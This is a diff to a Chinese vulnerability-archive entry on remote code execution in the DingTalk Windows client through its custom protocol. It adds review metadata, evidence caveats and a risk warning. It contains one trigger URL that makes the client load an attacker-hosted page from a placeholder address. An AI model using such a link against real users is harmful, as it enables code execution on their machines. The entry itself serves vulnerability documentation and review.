@@ -1,10 +1,50 @@
 ---
 source: "MrWQ/vulnerability-paper"
+title: "钉钉Windows客户端 自定义协议载入页面到客户端远程代码执行"
+product: "钉钉Windows客户端"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "声称<6.3.25-Release.2149108，Windows x86"
+prerequisites: "需用户/系统打开dingtalk协议链接"
+side_effects: "命令/代码执行示例可能改变主机状态"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/y1ycubUpoxd_gZSot7xQ0Q"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E4%B9%8B%E9%92%89%E9%92%89/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E4%B9%8B%E9%92%89%E9%92%89%20RCE.md"
+id: "vw-46131f21aa3c3c7ed472b0e7"
+entity_id: "ve-46131f21aa3c3c7ed472b0e7"
+schema_version: "1"
 ---
 
-# 红队攻防实战之钉钉 RCE
+# 钉钉Windows客户端 自定义协议载入页面到客户端远程代码执行
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：钉钉Windows客户端；自定义协议载入页面到客户端RCE
+- 版本、配置及部署条件：声称<6.3.25-Release.2149108，Windows x86
+- 认证与权限前提：需用户/系统打开dingtalk协议链接
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 网页POC主体和证明均为未视检图片，文本只含触发协议及shellcode替换说明，缺根因与完整代码
+- 客户端漏洞应与Web服务端RCE分类区分，不能省略用户交互条件
+- MSF handler片段缺payload匹配说明；calc触发URL少http与后文不一致
+- 反连教程和感悟占比高，保留来源版权说明；修复版本仅边界推断无公告
+
+## 操作风险
+
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/y1ycubUpoxd_gZSot7xQ0Q)
 
 我这一生如履薄冰，你说我能走到对岸吗？
@@ -34,7 +74,7 @@ dingtalk://dingtalkclient/page/link?url=x.x.x.x/calc.html&pc_slide=true
 
 ```
 
-### 漏洞证明：
+#### 漏洞证明：
 
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mMvBupvTOsrLUFDzIThyDeEyJNUlKYChzVEzciaO6BVO0TzOedA2K9ibRQ/640?wx_fmt=jpeg&from=appmsg)
 
